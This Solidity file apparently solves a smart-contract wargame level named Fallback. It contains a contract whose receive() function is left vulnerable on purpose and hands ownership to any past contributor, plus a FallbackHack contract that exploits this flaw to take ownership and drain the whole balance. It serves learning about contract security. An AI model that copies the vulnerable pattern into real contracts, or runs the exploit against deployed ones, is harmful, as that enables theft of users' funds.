// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

// goal: claim ownership and transfer all money

// an original contract
// deploy it first
contract Fallback {

    mapping(address => uint) public contributions;
    address payable public owner;

    constructor() {
        owner = payable (msg.sender);
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner {
            require(
                msg.sender == owner,
                "caller is not the owner"
            );
            _;
        }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if(contributions[msg.sender] > contributions[owner]) {
            owner = payable (msg.sender);
        }
    }

    function getContribution() public view returns (uint) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        owner.transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = payable (msg.sender);
    }
}



// a contract that hacks the original one
// deploy it second
// and use the address of deployed Fallback as an argument in constructor
contract FallbackHack {
    address payable private owner;
    Fallback contractToHack;
    
    constructor(address payable _contractToHack) {
        owner = payable (msg.sender);
        contractToHack = Fallback (_contractToHack);
    }

    // use this function with a little value (>= 2 Wei)
    function hack() public payable { 
        contractToHack.contribute{value: 1}();
        payable (address (contractToHack)).transfer(1);
        contractToHack.withdraw();
        owner.transfer(address (this).balance);
    }

}
